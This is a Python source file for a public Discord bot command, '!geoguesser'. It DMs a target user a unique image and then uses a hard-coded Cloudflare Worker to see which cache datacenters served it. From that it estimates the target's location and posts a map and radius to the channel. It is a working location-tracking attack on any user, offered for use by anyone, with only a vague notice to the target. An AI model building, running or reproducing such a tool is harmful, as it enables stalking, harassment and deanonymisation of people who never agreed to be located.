"""
geoguesser.py – !geoguesser <@user>
Generates a unique random image, sends it to a target user,
then uses Cloudflare cache enumeration to estimate their location.
Public command – anyone can use it.
FIX: increased wait time, keep image in channel, add reminder to target.
"""

import asyncio
import aiohttp
import io
import random
import discord
from PIL import Image, ImageDraw
from datetime import datetime
import math
import traceback

# ============ CONFIGURATION ============
WORKER_URL = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
WAIT_SECONDS = 30  # increased from 12 to give target time to open DM
KEEP_IMAGE_IN_CHANNEL = True  # if True, do not delete the upload message
# =======================================

# Approximate coordinates for Cloudflare colos
COLO_COORDS = {
    'EWR': {'lat': 40.6895, 'lon': -74.1745, 'name': 'Newark, NJ'},
    'IAD': {'lat': 38.9531, 'lon': -77.4475, 'name': 'Washington DC'},
    'ATL': {'lat': 33.6407, 'lon': -84.4277, 'name': 'Atlanta, GA'},
    'ORD': {'lat': 41.9742, 'lon': -87.9073, 'name': 'Chicago, IL'},
    'DFW': {'lat': 32.8998, 'lon': -97.0403, 'name': 'Dallas, TX'},
    'LAX': {'lat': 33.9416, 'lon': -118.4085, 'name': 'Los Angeles, CA'},
    'SEA': {'lat': 47.4502, 'lon': -122.3088, 'name': 'Seattle, WA'},
    'MIA': {'lat': 25.7959, 'lon': -80.2870, 'name': 'Miami, FL'},
    'DEN': {'lat': 39.8561, 'lon': -104.6737, 'name': 'Denver, CO'},
    'PHX': {'lat': 33.4484, 'lon': -112.0740, 'name': 'Phoenix, AZ'},
    'SJC': {'lat': 37.3382, 'lon': -121.8863, 'name': 'San Jose, CA'},
    'PDX': {'lat': 45.5898, 'lon': -122.5951, 'name': 'Portland, OR'},
    'SLC': {'lat': 40.7608, 'lon': -111.8910, 'name': 'Salt Lake City, UT'},
    'MSP': {'lat': 44.9778, 'lon': -93.2650, 'name': 'Minneapolis, MN'},
    'STL': {'lat': 38.6270, 'lon': -90.1994, 'name': 'St. Louis, MO'},
    'BOS': {'lat': 42.3601, 'lon': -71.0589, 'name': 'Boston, MA'},
    'PHL': {'lat': 39.9526, 'lon': -75.1652, 'name': 'Philadelphia, PA'},
    'CLT': {'lat': 35.2271, 'lon': -80.8431, 'name': 'Charlotte, NC'},
    'TPA': {'lat': 27.9506, 'lon': -82.4572, 'name': 'Tampa, FL'},
    'HOU': {'lat': 29.7604, 'lon': -95.3698, 'name': 'Houston, TX'},
}

def generate_random_image():
    """Generate a 64x64 PNG with random pixels + random lines – totally unique each time."""
    w, h = 64, 64
    img = Image.new('RGB', (w, h))
    pixels = img.load()
    for x in range(w):
        for y in range(h):
            pixels[x, y] = (random.randint(0, 255),
                           random.randint(0, 255),
                           random.randint(0, 255))
    draw = ImageDraw.Draw(img)
    for _ in range(8):
        x1, y1 = random.randint(0, w), random.randint(0, h)
        x2, y2 = random.randint(0, w), random.randint(0, h)
        draw.line([(x1, y1), (x2, y2)], fill=(random.randint(0, 255),
                                              random.randint(0, 255),
                                              random.randint(0, 255)), width=2)
    img_bytes = io.BytesIO()
    img.save(img_bytes, format='PNG')
    img_bytes.seek(0)
    return img_bytes

def haversine(lat1, lon1, lat2, lon2):
    """Distance in miles between two coordinates."""
    R = 3959
    lat1, lon1, lat2, lon2 = map(math.radians, [lat1, lon1, lat2, lon2])
    dlat = lat2 - lat1
    dlon = lon2 - lon1
    a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
    return R * 2 * math.asin(math.sqrt(a))

async def run(client, message, args):
    # Input validation
    if not args.strip():
        await message.channel.send("Usage: `!geoguesser <@user or user_id>`")
        return

    target_arg = args.strip().split()[0]

    try:
        if target_arg.startswith('<@') and target_arg.endswith('>'):
            user_id = int(target_arg.strip('<@!>'))
        else:
            user_id = int(target_arg)
        target = await client.fetch_user(user_id)
    except (ValueError, discord.NotFound):
        await message.channel.send("❌ Invalid user ID or mention.")
        return

    # Initial status message
    status_msg = await message.channel.send("🖼️ Generating unique image...")

    try:
        # Generate image
        img_bytes = generate_random_image()

        # Update status (handle possible deletion)
        try:
            await status_msg.edit(content="📤 Uploading to Discord CDN...")
        except discord.NotFound:
            status_msg = await message.channel.send("📤 Uploading to Discord CDN...")

        # Upload to channel to get CDN URL
        try:
            sent = await message.channel.send(
                file=discord.File(img_bytes, filename="geo.png")
            )
            if not sent.attachments:
                await message.channel.send("❌ No attachment URL returned.")
                return
            image_url = sent.attachments[0].url

            # Keep the image in channel to ensure Cloudflare caches it
            if not KEEP_IMAGE_IN_CHANNEL:
                try:
                    await sent.delete()
                except discord.NotFound:
                    pass
            else:
                # Optionally edit the message to indicate it's part of the scan
                try:
                    await sent.edit(content="🔍 Image used for geolocation scan (will be deleted after scan)")
                except:
                    pass
        except Exception as e:
            await message.channel.send(f"❌ Failed to upload image: {e}")
            return

        # DM the image to the target
        try:
            await status_msg.edit(content=f"📨 Sending image to {target.name}...")
        except discord.NotFound:
            status_msg = await message.channel.send(f"📨 Sending image to {target.name}...")

        img_bytes.seek(0)
        try:
            await target.send(file=discord.File(img_bytes, filename="geo.png"))
            # Also send a follow-up message to remind them to open the image
            try:
                await target.send("👀 Please open the image I just sent to help with the geolocation scan. (The image will be used to determine your approximate region via Cloudflare cache.)")
            except:
                pass
        except discord.Forbidden:
            await message.channel.send("❌ Cannot DM that user (DMs closed).")
            # If we kept the image in channel, we may want to delete it now
            if KEEP_IMAGE_IN_CHANNEL:
                try:
                    await sent.delete()
                except:
                    pass
            return
        except Exception as e:
            await message.channel.send(f"❌ DM failed: {e}")
            if KEEP_IMAGE_IN_CHANNEL:
                try:
                    await sent.delete()
                except:
                    pass
            return

        # Wait for cache propagation – longer time
        try:
            await status_msg.edit(content=f"⏳ Waiting {WAIT_SECONDS} seconds for cache & notifications...")
        except discord.NotFound:
            status_msg = await message.channel.send(f"⏳ Waiting {WAIT_SECONDS} seconds for cache & notifications...")
        await asyncio.sleep(WAIT_SECONDS)

        # Enumerate Cloudflare cache
        try:
            await status_msg.edit(content="🔍 Enumerating Cloudflare cache locations...")
        except discord.NotFound:
            status_msg = await message.channel.send("🔍 Enumerating Cloudflare cache locations...")

        api_url = f"{WORKER_URL}?url={image_url}"

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, timeout=35) as resp:
                    if resp.status != 200:
                        await message.channel.send(f"❌ Worker error (HTTP {resp.status})")
                        return
                    data = await resp.json()
        except asyncio.TimeoutError:
            await message.channel.send("⏰ Worker timed out – try again later.")
            return
        except Exception as e:
            await message.channel.send(f"⚠️ Worker request failed: {e}")
            return

        # Process worker response
        datacenters = data.get('datacenters', [])
        hits = data.get('hits', 0)
        checked = data.get('checked', 0)

        if not datacenters:
            await message.channel.send(
                "❌ No cache hits. The target may not have downloaded the image, or the cache hasn't propagated yet. "
                "Try again with a longer wait (edit WAIT_SECONDS in the command) or ensure the target opens the image."
            )
            # Optionally delete the kept image
            if KEEP_IMAGE_IN_CHANNEL:
                try:
                    await sent.delete()
                except:
                    pass
            return

        coords = []
        colo_names = []
        for colo in datacenters:
            if colo in COLO_COORDS:
                coords.append(COLO_COORDS[colo])
                colo_names.append(f"{colo} ({COLO_COORDS[colo]['name']})")
            else:
                colo_names.append(colo)

        if not coords:
            await message.channel.send(f"Found datacenters: {', '.join(datacenters)} – but no coordinates available.")
            return

        # Compute estimation
        center_lat = sum(c['lat'] for c in coords) / len(coords)
        center_lon = sum(c['lon'] for c in coords) / len(coords)
        max_dist = max(
            haversine(center_lat, center_lon, c['lat'], c['lon']) for c in coords
        )
        radius_miles = max_dist * 1.5 if max_dist > 0 else 250

        markers = '|'.join([f"{c['lat']},{c['lon']},red-pushpin" for c in coords])
        map_url = (
            f"https://staticmap.openstreetmap.de/staticmap.php"
            f"?center={center_lat},{center_lon}&zoom=5&size=600x400"
            f"&markers={markers}&maptype=mapnik"
        )

        embed = discord.Embed(
            title="📍 GeoGuesser – Location Estimate",
            description=(
                f"**Target:** {target.name}\n"
                f"**Image URL:** [Link]({image_url})\n"
                f"**Datacenters found:** {len(datacenters)}\n"
                f"**Estimated radius:** ~{radius_miles:.0f} miles"
            ),
            color=0x00ff00,
            timestamp=datetime.now()
        )
        embed.add_field(
            name="🌐 Datacenters",
            value="\n".join(colo_names[:12]) +
                  ("" if len(colo_names) <= 12 else f"\n... and {len(colo_names)-12} more"),
            inline=False
        )
        embed.add_field(name="📊 Scan Stats", value=f"Checked: {checked}\nHits: {hits}", inline=True)
        embed.add_field(name="📍 Center", value=f"{center_lat:.4f}, {center_lon:.4f}", inline=True)
        embed.set_footer(text="Powered by Cloudflare Cache Enumeration")
        embed.set_image(url=map_url)

        # Delete status message (safe)
        try:
            await status_msg.delete()
        except discord.NotFound:
            pass

        # Delete the kept image if we want to clean up
        if KEEP_IMAGE_IN_CHANNEL:
            try:
                await sent.delete()
            except:
                pass

        # Send final result
        await message.channel.send(embed=embed)

    except Exception as e:
        # Print full traceback to console so you can see exactly what went wrong
        traceback.print_exc()
        error_msg = f"⚠️ Unexpected error: {e}"
        try:
            await message.channel.send(error_msg)
        except:
            pass
